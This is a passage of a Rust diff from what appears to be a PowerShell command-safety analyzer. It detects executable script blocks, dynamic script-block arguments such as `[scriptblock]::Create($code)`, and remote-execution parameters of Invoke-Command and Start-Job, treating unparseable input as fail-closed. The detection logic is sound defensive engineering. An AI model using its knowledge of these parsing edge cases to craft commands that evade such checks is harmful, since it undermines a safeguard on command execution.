+    find_shell_delimiter_close(raw, open, ShellType::PowerShell).map(|close| close + 1)
+}
+
+#[derive(Clone, Copy)]
+enum PowerShellCollectionScriptblockArgument {
+    Static { open: usize, close: usize },
+    Dynamic,
+    Inert { end: usize },
+}
+
+fn powershell_member_is_attached(raw: &str, dot: usize) -> bool {
+    let Some(prefix) = raw.get(..dot) else {
+        return false;
+    };
+    prefix
+        .chars()
+        .next_back()
+        .is_some_and(|ch| !ch.is_whitespace())
+        || prefix.ends_with("`\n")
+        || prefix.ends_with("`\r")
+        || prefix.ends_with("`\r\n")
+}
+
+fn powershell_complete_string_literal_end(raw: &str, start: usize) -> Option<usize> {
+    let mut index = start;
+    let first = raw.get(index..)?.chars().next()?;
+    let kind = powershell_function_quote(first)?;
+    index += first.len_utf8();
+    while let Some(ch) = raw.get(index..).and_then(|suffix| suffix.chars().next()) {
+        if kind == PowerShellFunctionQuote::Double && ch == '`' {
+            index += ch.len_utf8();
+            let escaped = raw.get(index..)?.chars().next()?;
+            index += escaped.len_utf8();
+            if escaped == '\r' && raw.as_bytes().get(index) == Some(&b'\n') {
+                index += 1;
+            }
+            continue;
+        }
+        // A double-quoted argument containing a subexpression is executable,
+        // so it cannot be proven to be the inert ForEach property overload.
+        if kind == PowerShellFunctionQuote::Double
+            && ch == '$'
+            && raw.as_bytes().get(index + ch.len_utf8()) == Some(&b'(')
+        {
+            return None;
+        }
+        if powershell_function_quote(ch) == Some(kind) {
+            let next = index + ch.len_utf8();
+            if kind == PowerShellFunctionQuote::Single
+                && raw
+                    .get(next..)
+                    .and_then(|suffix| suffix.chars().next())
+                    .and_then(powershell_function_quote)
+                    == Some(kind)
+            {
+                index = next
+                    + raw
+                        .get(next..)
+                        .and_then(|suffix| suffix.chars().next())
+                        .map_or(0, char::len_utf8);
+                continue;
+            }
+            return Some(next);
+        }
+        index += ch.len_utf8();
+    }
+    None
+}
+
+fn powershell_type_literal_end(raw: &str, start: usize) -> Option<usize> {
+    if raw.as_bytes().get(start) != Some(&b'[') {
+        return None;
+    }
+    let mut depth = 0usize;
+    let mut index = start;
+    while let Some(ch) = raw.get(index..).and_then(|suffix| suffix.chars().next()) {
+        if ch == '`' {
+            index += ch.len_utf8();
+            let escaped = raw.get(index..)?.chars().next()?;
+            index += escaped.len_utf8();
+            continue;
+        }
+        match ch {
+            '[' => depth = depth.saturating_add(1),
+            ']' => {
+                depth = depth.checked_sub(1)?;
+                if depth == 0 {
+                    return Some(index);
+                }
+            }
+            _ => {}
+        }
+        index += ch.len_utf8();
+    }
+    None
+}
+
+fn powershell_collection_static_scriptblock(
+    raw: &str,
+    mut start: usize,
+    mut expression_end: usize,
+) -> Option<(usize, usize)> {
+    for _ in 0..MAX_SHELL_DELIMITER_DEPTH {
+        start = skip_powershell_whitespace(raw, start);
+        let byte = *raw.as_bytes().get(start)?;
+        if byte == b'{' {
+            let close = find_shell_delimiter_close(raw, start, ShellType::PowerShell)?;
+            if close >= expression_end {
+                return None;
+            }
+            let after = skip_powershell_whitespace(raw, close + 1);
+            if after == expression_end || raw.as_bytes().get(after) == Some(&b',') {
+                return Some((start, close));
+            }
+            return None;
+        }
+        if byte != b'(' {
+            return None;
+        }
+        let close = find_shell_delimiter_close(raw, start, ShellType::PowerShell)?;
+        if close >= expression_end {
+            return None;
+        }
+        let after = skip_powershell_whitespace(raw, close + 1);
+        if after != expression_end && raw.as_bytes().get(after) != Some(&b',') {
+            return None;
+        }
+        expression_end = close;
+        start += 1;
+    }
+    None
+}
+
+fn powershell_collection_scriptblock_argument(
+    raw: &str,
+    dot: usize,
+) -> Option<PowerShellCollectionScriptblockArgument> {
+    if !powershell_member_is_attached(raw, dot) {
+        return None;
+    }
+    let names = [
+        (".psforeach", true),
+        (".pswhere", false),
+        (".foreach", true),
+        (".where", false),
+    ];
+    let (method_end, foreach) = names.iter().find_map(|(name, foreach)| {
+        let end = dot.checked_add(name.len())?;
+        raw.get(dot..end)
+            .is_some_and(|candidate| candidate.eq_ignore_ascii_case(name))
+            .then_some((end, *foreach))
+    })?;
+    match raw.as_bytes().get(method_end).copied()? {
+        b'{' => {
+            let close = find_shell_delimiter_close(raw, method_end, ShellType::PowerShell)?;
+            Some(PowerShellCollectionScriptblockArgument::Static {
+                open: method_end,
+                close,
+            })
+        }
+        b'(' => {
+            let close = find_shell_delimiter_close(raw, method_end, ShellType::PowerShell)?;
+            let argument_start = skip_powershell_whitespace(raw, method_end + 1);
+            if argument_start == close {
+                return Some(PowerShellCollectionScriptblockArgument::Inert { end: close + 1 });
+            }
+            if let Some((open, scriptblock_close)) =
+                powershell_collection_static_scriptblock(raw, argument_start, close)
+            {
+                return Some(PowerShellCollectionScriptblockArgument::Static {
+                    open,
+                    close: scriptblock_close,
+                });
+            }
+            if foreach
+                && powershell_function_quote(raw.get(argument_start..)?.chars().next()?).is_some()
+            {
+                let string_end = powershell_complete_string_literal_end(raw, argument_start)?;
+                let after = skip_powershell_whitespace(raw, string_end);
+                if after == close {
+                    return Some(PowerShellCollectionScriptblockArgument::Inert { end: close + 1 });
+                }
+                return None;
+            }
+            if foreach && raw.as_bytes().get(argument_start) == Some(&b'[') {
+                let type_end = powershell_type_literal_end(raw, argument_start)?;
+                if skip_powershell_whitespace(raw, type_end + 1) == close {
+                    return Some(PowerShellCollectionScriptblockArgument::Inert { end: close + 1 });
+                }
+                // The ForEach type overload is inert only when the complete
+                // argument is exactly a type literal. Static-member calls such
+                // as `[scriptblock]::Create($code)` produce a ScriptBlock at
+                // runtime and therefore cannot be treated as a property/type
+                // overload merely because they share the same prefix.
+                return Some(PowerShellCollectionScriptblockArgument::Dynamic);
+            }
+            Some(PowerShellCollectionScriptblockArgument::Dynamic)
+        }
+        _ => None,
+    }
+}
+
+fn capture_powershell_executable_body(
+    raw: &str,
+    open: usize,
+    scan: &mut ExecutableSubstitutionScan,
+) -> Option<usize> {
+    if let Some(close) = find_shell_delimiter_close(raw, open, ShellType::PowerShell) {
+        if let Some(body) = raw
+            .get(open + 1..close)
+            .filter(|body| !body.trim().is_empty())
+        {
+            scan.bodies.push(ExecutableBody {
+                input: body.to_string(),
+                shell: ShellType::PowerShell,
+            });
+        }
+        return Some(close + 1);
+    }
+
+    // The suffix is still useful input for the normal rule pipeline, but the
+    // missing close (including delimiter-budget exhaustion) must remain an
+    // explicit fail-closed fact instead of looking like an empty script block.
+    if let Some(suffix) = raw.get(open + 1..) {
+        if !suffix.trim().is_empty() {
+            scan.bodies.push(ExecutableBody {
+                input: suffix.to_string(),
+                shell: ShellType::PowerShell,
+            });
+        }
+    }
+    record_shell_execution_gap(scan, ShellExecutionGap::IncompletePowerShellInvocation);
+    None
+}
+
+fn scan_powershell_here_string_subexpressions(
+    raw: &str,
+    here_string: tokenize::PowerShellHereString,
+    scan: &mut ExecutableSubstitutionScan,
+) {
+    if here_string.kind != tokenize::PowerShellQuoteKind::Double {
+        return;
+    }
+    let Some(content) = raw.get(here_string.content_start..here_string.content_end) else {
+        record_shell_execution_gap(scan, ShellExecutionGap::IncompletePowerShellInvocation);
+        return;
+    };
+    let bytes = content.as_bytes();
+    let mut index = 0usize;
+    while index < bytes.len() {
+        let Some(ch) = content
+            .get(index..)
+            .and_then(|suffix| suffix.chars().next())
+        else {
+            record_shell_execution_gap(scan, ShellExecutionGap::IncompletePowerShellInvocation);
+            return;
+        };
+        if ch == '`' {
+            index += ch.len_utf8();
+            let Some(escaped) = content
+                .get(index..)
+                .and_then(|suffix| suffix.chars().next())
+            else {
+                return;
+            };
+            index += escaped.len_utf8();
+            if escaped == '\r' && bytes.get(index) == Some(&b'\n') {
+                index += 1;
+            }
+            continue;
+        }
+        if ch == '$' && bytes.get(index + 1) == Some(&b'(') {
+            let Some(next) = capture_powershell_executable_body(content, index + 1, scan) else {
+                return;
+            };
+            index = next;
+            continue;
+        }
+        index += ch.len_utf8();
+    }
+}
+
+const POWERSHELL_COMMON_PARAMETERS: &[&str] = &[
+    "confirm",
+    "debug",
+    "erroraction",
+    "errorvariable",
+    "informationaction",
+    "informationvariable",
+    "outbuffer",
+    "outvariable",
+    "pipelinevariable",
+    "progressaction",
+    "verbose",
+    "warningaction",
+    "warningvariable",
+    "whatif",
+];
+
+const POWERSHELL_INVOKE_COMMAND_PARAMETERS: &[&str] = &[
+    "allowredirection",
+    "applicationname",
+    "argumentlist",
+    "asjob",
+    "authentication",
+    "certificatethumbprint",
+    "computername",
+    "configurationname",
+    "connectionuri",
+    "connectingtimeout",
+    "containerid",
+    "credential",
+    "enablenetworkaccess",
+    "filepath",
+    "hidecomputername",
+    "hostname",
+    "indisconnectedsession",
+    "inputobject",
+    "jobname",
+    "keyfilepath",
+    "nonewscope",
+    "options",
+    "port",
+    "remotedebug",
+    "runasadministrator",
+    "scriptblock",
+    "session",
+    "sessionname",
+    "sessionoption",
+    "sshconnection",
+    "sshtransport",
+    "strictmode",
+    "subsystem",
+    "throttlelimit",
+    "username",
+    "usessl",
+    "vmid",
+    "vmname",
+];
+
+const POWERSHELL_START_JOB_PARAMETERS: &[&str] = &[
+    "argumentlist",
+    "authentication",
+    "credential",
+    "definitionname",
+    "definitionpath",
+    "filepath",
+    "initializationscript",
+    "inputobject",
+    "literalpath",
+    "name",
+    "psversion",
+    "runas32",
+    "scriptblock",
+    "type",
+    "workingdirectory",
+];
+
+const POWERSHELL_START_THREADJOB_PARAMETERS: &[&str] = &[
+    "argumentlist",
+    "filepath",
+    "initializationscript",
+    "inputobject",
+    "name",
+    "scriptblock",
+    "streaminghost",
+    "throttlelimit",
+];
+
+const POWERSHELL_FOREACH_OBJECT_PARAMETERS: &[&str] = &[
+    "argumentlist",
+    "asjob",
+    "begin",
+    "end",
+    "inputobject",
+    "membername",
+    "parallel",
+    "process",
+    "remainingscripts",
+    "throttlelimit",
+    "timeoutseconds",
+    "usenewrunspace",
+];
+
+const POWERSHELL_WHERE_OBJECT_PARAMETERS: &[&str] = &[
+    "ccontains",
+    "ceq",
+    "cge",
+    "cgt",
+    "cin",
+    "cle",
+    "clike",
+    "clt",
+    "cmatch",
+    "cne",
+    "cnotcontains",
+    "cnotin",
+    "cnotlike",
+    "cnotmatch",
+    "contains",
+    "eq",
+    "filterscript",
+    "ge",
+    "gt",
+    "in",
+    "inputobject",
+    "is",
+    "isnot",
+    "le",
+    "like",
+    "lt",
+    "match",
+    "ne",
+    "not",
+    "notcontains",
+    "notin",
+    "notlike",
+    "notmatch",
+    "property",
+    "value",
+];
+
+#[derive(Clone, Copy, PartialEq, Eq)]
+enum PowerShellParameterMatch {
+    NoMatch,
+    Unique(&'static str),
+    Ambiguous,
+}
+
+fn powershell_command_parameters(command: &str) -> Option<&'static [&'static str]> {
+    match command {
+        "invoke-command" | "icm" => Some(POWERSHELL_INVOKE_COMMAND_PARAMETERS),
+        "start-job" | "sajb" => Some(POWERSHELL_START_JOB_PARAMETERS),
+        "start-threadjob" => Some(POWERSHELL_START_THREADJOB_PARAMETERS),
+        "foreach-object" | "%" | "foreach" => Some(POWERSHELL_FOREACH_OBJECT_PARAMETERS),
+        "where-object" | "?" | "where" => Some(POWERSHELL_WHERE_OBJECT_PARAMETERS),
+        _ => None,
+    }
+}
+
+fn powershell_parameter_token(raw: &str) -> Option<(String, Option<String>)> {
+    let normalized =
+        crate::rules::command::normalize_powershell_parameter_token(raw, ShellType::PowerShell);
+    let lower = normalized.to_ascii_lowercase();
+    let parameter = lower.strip_prefix('-')?;
+    if parameter.is_empty() {
+        return None;
+    }
+    let (name, value) = parameter
+        .split_once([':', '='])
+        .map_or((parameter, None), |(name, value)| (name, Some(value)));
+    if name.is_empty() {
+        return None;
+    }
+    Some((name.to_string(), value.map(str::to_string)))
+}
+
+fn powershell_parameter_alias(command: &str, alias: &str) -> Option<&'static str> {
+    let common = match alias {
+        "cf" => Some("confirm"),
+        "db" => Some("debug"),
+        "ea" => Some("erroraction"),
+        "ev" => Some("errorvariable"),
+        "infa" => Some("informationaction"),
+        "iv" => Some("informationvariable"),
+        "ob" => Some("outbuffer"),
+        "ov" => Some("outvariable"),
+        "proga" => Some("progressaction"),
+        "pv" => Some("pipelinevariable"),
+        "vb" => Some("verbose"),
+        "wa" => Some("warningaction"),
+        "wi" => Some("whatif"),
+        "wv" => Some("warningvariable"),
+        _ => None,
+    };
+    if common.is_some() {
+        return common;
+    }
+    match command {
+        "invoke-command" | "icm" => match alias {
+            "args" => Some("argumentlist"),
+            "cn" => Some("computername"),
+            "command" => Some("scriptblock"),
+            "cu" | "uri" => Some("connectionuri"),
+            "disconnected" => Some("indisconnectedsession"),
+            "hcn" => Some("hidecomputername"),
+            "identityfilepath" => Some("keyfilepath"),
+            "pspath" => Some("filepath"),
+            "vmguid" => Some("vmid"),
+            _ => None,
+        },
+        "start-job" | "sajb" => match alias {
+            "args" => Some("argumentlist"),
+            "command" => Some("scriptblock"),
+            "lp" | "pspath" => Some("literalpath"),
+            _ => None,
+        },
+        "start-threadjob" => match alias {
+            "args" => Some("argumentlist"),
+            "command" => Some("scriptblock"),
+            _ => None,
+        },
+        "foreach-object" | "%" | "foreach" => match alias {
+            "args" => Some("argumentlist"),
+            _ => None,
+        },
+        _ => None,
+    }
+}
+
+fn powershell_resolve_parameter(
+    command: &str,
+    raw: &str,
+) -> (PowerShellParameterMatch, Option<String>) {
+    let Some(parameters) = powershell_command_parameters(command) else {
+        return (PowerShellParameterMatch::NoMatch, None);
+    };
+    let Some((prefix, value)) = powershell_parameter_token(raw) else {
+        return (PowerShellParameterMatch::NoMatch, None);
+    };
+    if let Some(parameter) = powershell_parameter_alias(command, &prefix) {
+        return (PowerShellParameterMatch::Unique(parameter), value);
+    }
+
+    let mut unique = None;
+    let mut ambiguous = false;
+    for candidate in parameters
+        .iter()
+        .copied()
+        .chain(POWERSHELL_COMMON_PARAMETERS.iter().copied())
+    {
+        if candidate == prefix {
+            return (PowerShellParameterMatch::Unique(candidate), value);
+        }
+        if candidate.starts_with(&prefix) {
+            if unique.is_some_and(|existing| existing != candidate) {
+                ambiguous = true;
+            } else {
+                unique = Some(candidate);
+            }
+        }
+    }
+
+    let binding = if ambiguous {
+        PowerShellParameterMatch::Ambiguous
+    } else if let Some(candidate) = unique {
+        PowerShellParameterMatch::Unique(candidate)
+    } else {
+        PowerShellParameterMatch::NoMatch
+    };
+    (binding, value)
+}
+
+fn powershell_scriptblock_parameter(name: &str) -> bool {
+    matches!(
+        name,
+        "scriptblock"
+            | "action"
+            | "process"
+            | "begin"
+            | "end"
+            | "remainingscripts"
+            | "filterscript"
+            | "expression"
+            | "initializationscript"
+            | "parallel"
+    )
+}
+
+fn powershell_legacy_scriptblock_parameter(name: &str) -> bool {
+    powershell_scriptblock_parameter(name) && name != "parallel"
+}
+
+fn powershell_parameter_is_switch(command: &str, name: &str) -> bool {
+    if matches!(name, "confirm" | "debug" | "verbose" | "whatif") {
+        return true;
+    }
+    match command {
+        "invoke-command" | "icm" => matches!(
+            name,
+            "allowredirection"
+                | "asjob"
+                | "enablenetworkaccess"
+                | "hidecomputername"
+                | "indisconnectedsession"
+                | "nonewscope"
+                | "remotedebug"
+                | "runasadministrator"
+                | "sshtransport"
+                | "usessl"
+        ),
+        "start-job" | "sajb" => name == "runas32",
+        "foreach-object" | "%" | "foreach" => matches!(name, "asjob" | "usenewrunspace"),
+        "where-object" | "?" | "where" => matches!(
+            name,
+            "ccontains"
+                | "ceq"
+                | "cge"
+                | "cgt"
+                | "cin"
+                | "cle"
+                | "clike"
+                | "clt"
+                | "cmatch"
+                | "cne"
+                | "cnotcontains"
+                | "cnotin"
+                | "cnotlike"
+                | "cnotmatch"
+                | "contains"
+                | "eq"
+                | "ge"
+                | "gt"
+                | "in"
+                | "is"
+                | "isnot"
+                | "le"
+                | "like"
+                | "lt"
+                | "match"
+                | "ne"
+                | "not"
+                | "notcontains"
+                | "notin"
+                | "notlike"
+                | "notmatch"
+        ),
+        _ => false,
+    }
+}
+
+fn powershell_static_scriptblock_end(
+    words: &[String],
+    first_value: &str,
+    mut next_word: usize,
+) -> Option<usize> {
+    let open = first_value.find('{')?;
+    if !first_value[..open].trim().is_empty() {
+        return None;
+    }
+    let mut body = first_value.to_string();
+    loop {
+        if find_shell_delimiter_close(&body, open, ShellType::PowerShell).is_some() {
+            return Some(next_word);
+        }
+        let Some(word) = words.get(next_word) else {
+            return Some(words.len());
+        };
+        body.push(' ');
+        body.push_str(word);
+        next_word += 1;
+    }
+}
+
+fn powershell_scriptblock_argument_executes(prefix: &str) -> bool {
+    let words = tokenize::split_words(prefix.trim());
+    let Some(command) = words.first() else {
+        return false;
+    };
+    let command = crate::rules::command::normalize_cmd_base(command, ShellType::PowerShell);
+    if matches!(
+        command.as_str(),
+        "%" | "if"
+            | "elseif"
+            | "else"
+            | "while"
+            | "do"
+            | "for"
+            | "foreach"
+            | "switch"
+            | "try"
+            | "catch"
+            | "finally"
+            | "trap"
+            | "foreach-object"
+            | "?"
+            | "where"
+            | "where-object"
+            | "invoke-command"
+            | "icm"
+            | "start-job"
+            | "sajb"
+            | "start-threadjob"
+            | "measure-command"
+            | "new-module"
+            | "trace-command"
+            | "register-objectevent"
+            | "register-engineevent"
+            | "register-wmievent"
+            | "register-scheduledjob"
+    ) {
+        return true;
+    }
+
+    words.iter().skip(1).any(|word| {
+        let (binding, _) = powershell_resolve_parameter(&command, word);
+        if let PowerShellParameterMatch::Unique(name) = binding {
+            return powershell_scriptblock_parameter(name);
+        }
+        powershell_parameter_token(word)
+            .is_some_and(|(name, _)| powershell_legacy_scriptblock_parameter(&name))
+    })
+}
+
+fn powershell_dynamic_scriptblock_argument(raw: &str) -> bool {
+    let words = tokenize::split_words(raw.trim());
+    let Some(command) = words.first() else {
+        return false;
+    };
+    let command = crate::rules::command::normalize_cmd_base(command, ShellType::PowerShell);
+    let positional_consumer = matches!(
+        command.as_str(),
+        "%" | "?"
+            | "where"
+            | "foreach-object"
+            | "where-object"
+            | "invoke-command"
+            | "icm"
+            | "start-job"
+            | "sajb"
+            | "start-threadjob"
+            | "measure-command"
+            | "new-module"
+    );
+    let dynamic = |word: &str| {
+        let word = crate::rules::command::normalize_shell_token(word, ShellType::PowerShell);
+        word.starts_with('$') || word.starts_with('@') || word.starts_with('[')
+    };
+
+    let mut positional_seen = false;
+    let mut index = 1usize;
+    while index < words.len() {
+        let word = &words[index];
+        let (binding, attached) = powershell_resolve_parameter(&command, word);
+        match binding {
+            PowerShellParameterMatch::Ambiguous => return true,
+            PowerShellParameterMatch::Unique(name) => {
+                let consumes_scriptblock = powershell_scriptblock_parameter(name);
+                let value = attached
+                    .as_deref()
+                    .or_else(|| words.get(index + 1).map(String::as_str));
+                if consumes_scriptblock {
+                    let Some(value) = value else {
+                        return true;
+                    };
+                    if dynamic(value) {
+                        return true;
+                    }
+                    if let Some(end) = powershell_static_scriptblock_end(
+                        &words,
+                        value,
+                        index + if attached.is_some() { 1 } else { 2 },
+                    ) {
+                        index = end;
+                        continue;
+                    }
+                }
+                index += if attached.is_none() && !powershell_parameter_is_switch(&command, name) {
+                    2
+                } else {
+                    1
+                };
+                continue;
+            }
+            PowerShellParameterMatch::NoMatch => {}
+        }
+
+        if let Some((name, attached)) = powershell_parameter_token(word) {
+            if powershell_legacy_scriptblock_parameter(&name) {
+                let value = attached
+                    .as_deref()
+                    .or_else(|| words.get(index + 1).map(String::as_str));
+                let Some(value) = value else {
+                    return true;
+                };
+                if dynamic(value) {
+                    return true;
+                }
+                if let Some(end) = powershell_static_scriptblock_end(
+                    &words,
+                    value,
+                    index + if attached.is_some() { 1 } else { 2 },
+                ) {
+                    index = end;
+                    continue;
+                }
+                index += if attached.is_some() { 1 } else { 2 };
+                continue;
+            }
+            index += 1;
+            continue;
+        }
+
+        if positional_consumer && !positional_seen {
+            positional_seen = true;
+            if dynamic(word) {
+                return true;
+            }
+            if let Some(end) = powershell_static_scriptblock_end(&words, word, index + 1) {
+                index = end;
+                continue;
+            }
+        }
+        index += 1;
+    }
+    false
+}
+
+#[derive(Clone, Copy, PartialEq, Eq)]
+enum PowerShellScriptblockScope {
+    Current,
+    Child,
+    Isolated,
+    Ambiguous,
+}
+
+fn powershell_switch_value(value: Option<&str>) -> Option<bool> {
+    match value {
+        None | Some("true" | "$true" | "1") => Some(true),
+        Some("false" | "$false" | "0") => Some(false),
+        Some(_) => None,
+    }
+}
+
+fn powershell_scriptblock_scope(command: &str, args: &[String]) -> PowerShellScriptblockScope {
+    if command == "&" {
+        return PowerShellScriptblockScope::Child;
+    }
+    if matches!(command, "start-job" | "sajb" | "start-threadjob") {
+        return PowerShellScriptblockScope::Isolated;
+    }
+    if matches!(command, "foreach-object" | "%" | "foreach") {
+        let mut parallel = false;
+        let mut index = 0usize;
+        while index < args.len() {
+            let (binding, attached) = powershell_resolve_parameter(command, &args[index]);
+            match binding {
+                PowerShellParameterMatch::Ambiguous => {
+                    return PowerShellScriptblockScope::Ambiguous;
+                }
+                PowerShellParameterMatch::Unique("parallel") => {
+                    parallel = true;
+                    let value = attached
+                        .as_deref()
+                        .or_else(|| args.get(index + 1).map(String::as_str));
+                    if let Some(value) = value {
+                        if let Some(end) = powershell_static_scriptblock_end(
+                            args,
+                            value,
+                            index + if attached.is_some() { 1 } else { 2 },
+                        ) {
+                            index = end;
+                            continue;
+                        }
+                    }
+                }
+                PowerShellParameterMatch::Unique(name) => {
+                    index += if attached.is_none() && !powershell_parameter_is_switch(command, name)
+                    {
+                        2
+                    } else {
+                        1
+                    };
+                    continue;
+                }
+                PowerShellParameterMatch::NoMatch => {
+                    if let Some(end) =
+                        powershell_static_scriptblock_end(args, &args[index], index + 1)
+                    {
+                        index = end;
+                        continue;
+                    }
+                }
+            }
+            index += 1;
+        }
+        return if parallel {
+            PowerShellScriptblockScope::Isolated
+        } else {
+            PowerShellScriptblockScope::Current
+        };
+    }
+    if !matches!(command, "invoke-command" | "icm") {
+        return PowerShellScriptblockScope::Current;
+    }
+
+    let mut no_new_scope = Some(false);
+    let mut isolated = false;
+    let mut index = 0usize;
+    while index < args.len() {
+        let (binding, attached) = powershell_resolve_parameter(command, &args[index]);
+        let name = match binding {
+            PowerShellParameterMatch::Ambiguous => {
+                return PowerShellScriptblockScope::Ambiguous;
+            }
+            PowerShellParameterMatch::Unique(name) => name,
+            PowerShellParameterMatch::NoMatch => {
+                if let Some(end) = powershell_static_scriptblock_end(args, &args[index], index + 1)
+                {
+                    index = end;
+                    continue;
+                }
+                index += 1;
+                continue;
+            }
+        };
+        if name == "nonewscope" {
+            no_new_scope = powershell_switch_value(attached.as_deref());
+        } else if name == "asjob" {
+            match powershell_switch_value(attached.as_deref()) {
+                Some(true) => isolated = true,
+                Some(false) => {}
+                None => return PowerShellScriptblockScope::Ambiguous,
+            }
+        } else if matches!(
+            name,
+            "computername"
+                | "connectionuri"
+                | "containerid"
+                | "hostname"
+                | "session"
+                | "sshconnection"
+                | "vmid"
+                | "vmname"
+        ) {
+            isolated = true;
+        }
+
+        if powershell_scriptblock_parameter(name) {
+            let value = attached
+                .as_deref()
+                .or_else(|| args.get(index + 1).map(String::as_str));
+            if let Some(value) = value {
+                if let Some(end) = powershell_static_scriptblock_end(
+                    args,
+                    value,
+                    index + if attached.is_some() { 1 } else { 2 },
+                ) {
+                    index = end;
+                    continue;
+                }
+            }
+        }
+        index += if attached.is_none() && !powershell_parameter_is_switch(command, name) {
+            2
+        } else {
+            1
+        };
+    }
+    if isolated {
+        PowerShellScriptblockScope::Isolated
+    } else {
+        match no_new_scope {
+            Some(true) => PowerShellScriptblockScope::Current,
+            Some(false) => PowerShellScriptblockScope::Child,
+            None => PowerShellScriptblockScope::Ambiguous,
+        }
+    }
+}
+
+fn powershell_variable_end(raw: &str, start: usize) -> Option<usize> {
+    let bytes = raw.as_bytes();
+    if bytes.get(start) != Some(&b'$') {
+        return None;
+    }
+    if bytes.get(start + 1) == Some(&b'{') {
+        let close = raw.get(start + 2..)?.find('}')? + start + 2;
+        return Some(close + 1);
+    }
+    let mut end = start + 1;
+    while bytes
+        .get(end)
+        .is_some_and(|byte| *byte == b'_' || *byte == b':' || byte.is_ascii_alphanumeric())
+    {
+        end += 1;
+    }
+    (end > start + 1).then_some(end)
+}
+
+fn push_powershell_switch_clause_bodies(raw: &str, scan: &mut ExecutableSubstitutionScan) {
+    let bytes = raw.as_bytes();
+    let mut quote = None::<(PowerShellFunctionQuote, bool)>;
+    let mut token_class = PowerShellLexTokenClass::Start;
+    let mut index = 0usize;
+    while index < bytes.len() {
+        let Some(ch) = raw.get(index..).and_then(|suffix| suffix.chars().next()) else {
+            return;
+        };
+        if let Some((kind, started_generic)) = quote {
+            if kind == PowerShellFunctionQuote::Double && ch == '`' {
+                index += ch.len_utf8();
+                if let Some(escaped) = raw.get(index..).and_then(|suffix| suffix.chars().next()) {
+                    index += escaped.len_utf8();
+                }
+                continue;
+            }
+            if powershell_function_quote(ch) == Some(kind) {
+                let next = index + ch.len_utf8();
+                if kind == PowerShellFunctionQuote::Single
+                    && raw
+                        .get(next..)
+                        .and_then(|suffix| suffix.chars().next())
+                        .and_then(powershell_function_quote)
+                        == Some(kind)
+                {
+                    index = next
+                        + raw
+                            .get(next..)
+                            .and_then(|suffix| suffix.chars().next())
+                            .map_or(0, char::len_utf8);
+                    continue;
+                }
+                quote = None;
+                token_class = if started_generic {
+                    PowerShellLexTokenClass::Generic
+                } else {
+                    PowerShellLexTokenClass::QuoteOnly
+                };
+            }
+            index += ch.len_utf8();
+            continue;
+        }
+        if bytes.get(index..index + 2) == Some(b"<#") && token_class.starts_special_token() {
+            index = powershell_block_comment_end_bytes(raw, index).unwrap_or(bytes.len());
+            token_class = PowerShellLexTokenClass::Start;
+            continue;
+        }
+        if bytes[index] == b'#' && token_class.starts_special_token() {
+            while index < bytes.len() && !matches!(bytes[index], b'\r' | b'\n') {
+                index += 1;
+            }
+            token_class = PowerShellLexTokenClass::Start;
+            continue;
+        }
+        if bytes[index] == b'@' && token_class.starts_special_token() {
+            if let Some(here_string) = tokenize::powershell_here_string(raw, index) {
+                scan_powershell_here_string_subexpressions(raw, here_string, scan);
+                index = here_string.end;
+                token_class = PowerShellLexTokenClass::QuoteOnly;
+                continue;
+            }
+        }
+        if powershell_stop_parsing_at(raw, index, token_class) {
+            index = skip_powershell_stop_parsing(raw, index);
+            token_class = PowerShellLexTokenClass::Generic;
+            continue;
+        }
+        if ch == '`' {
+            index += ch.len_utf8();
+            if let Some(escaped) = raw.get(index..).and_then(|suffix| suffix.chars().next()) {
+                if !matches!(escaped, '\n' | '\r') {
+                    token_class = PowerShellLexTokenClass::Generic;
+                }
+                index += escaped.len_utf8();
+            }
+            continue;
+        }
+        if let Some(kind) = powershell_function_quote(ch) {
+            quote = Some((kind, token_class == PowerShellLexTokenClass::Generic));
+            index += ch.len_utf8();
+            continue;
+        }
+        if ch == '{' {
+            let Some(close) = find_shell_delimiter_close(raw, index, ShellType::PowerShell) else {
+                record_shell_execution_gap(scan, ShellExecutionGap::IncompletePowerShellInvocation);
+                return;
+            };
+            if let Some(body) = raw.get(index + 1..close) {
+                scan.bodies.push(ExecutableBody {
+                    input: body.to_string(),
+                    shell: ShellType::PowerShell,
+                });
+            }
+            index = close + 1;
+            continue;
+        }
+        token_class = match ch {
+            ch if ch.is_whitespace() => PowerShellLexTokenClass::Start,
+            ',' | ';' | '&' | '|' | '=' | '(' | ')' | '{' | '}' => PowerShellLexTokenClass::Start,
+            '<' | '>' if token_class.starts_special_token() => PowerShellLexTokenClass::Start,
+            _ => PowerShellLexTokenClass::Generic,
+        };
+        index += ch.len_utf8();
+    }
+}
+
+fn powershell_top_level_hashtable_separator(raw: &str) -> Option<usize> {
+    let bytes = raw.as_bytes();
+    let mut quote = None::<PowerShellFunctionQuote>;
+    let mut token_class = PowerShellLexTokenClass::Start;
+    let mut bracket_depth = 0usize;
+    let mut index = 0usize;
+
+    while index < bytes.len() {
+        let ch = raw.get(index..)?.chars().next()?;
+        if let Some(kind) = quote {
+            if kind == PowerShellFunctionQuote::Double && ch == '`' {
+                index += ch.len_utf8();
+                let escaped = raw.get(index..)?.chars().next()?;
+                index += escaped.len_utf8();
+                if escaped == '\r' && bytes.get(index) == Some(&b'\n') {
+                    index += 1;
+                }
+                continue;
+            }
+            if powershell_function_quote(ch) == Some(kind) {
+                let next = index + ch.len_utf8();
+                if kind == PowerShellFunctionQuote::Single
+                    && raw
+                        .get(next..)
+                        .and_then(|suffix| suffix.chars().next())
+                        .and_then(powershell_function_quote)
+                        == Some(kind)
+                {
+                    index = next
+                        + raw
+                            .get(next..)
+                            .and_then(|suffix| suffix.chars().next())?
+                            .len_utf8();
+                    continue;
+                }
+                quote = None;
+            }
+            index += ch.len_utf8();
+            continue;
+        }
+
+        if bytes.get(index..index + 2) == Some(b"<#") && token_class.starts_special_token() {
+            index = powershell_block_comment_end_bytes(raw, index)?;
+            token_class = PowerShellLexTokenClass::Start;
+            continue;
+        }
+        if bytes[index] == b'@' && token_class.starts_special_token() {
+            if let Some(here_string) = tokenize::powershell_here_string(raw, index) {
+                index = here_string.end;
+                token_class = PowerShellLexTokenClass::QuoteOnly;
+                continue;
+            }
+        }
+        if bytes[index] == b'#' && token_class.starts_special_token() {
+            while index < bytes.len() && !matches!(bytes[index], b'\r' | b'\n') {
+                index += 1;
+            }
+            token_class = PowerShellLexTokenClass::Start;
+            continue;
+        }
+        if powershell_stop_parsing_at(raw, index, token_class) {
+            index = skip_powershell_stop_parsing(raw, index);
+            token_class = PowerShellLexTokenClass::Generic;
+            continue;
+        }
+        if ch == '`' {
+            index += ch.len_utf8();
+            let escaped = raw.get(index..)?.chars().next()?;
+            index += escaped.len_utf8();
+            if escaped == '\r' && bytes.get(index) == Some(&b'\n') {
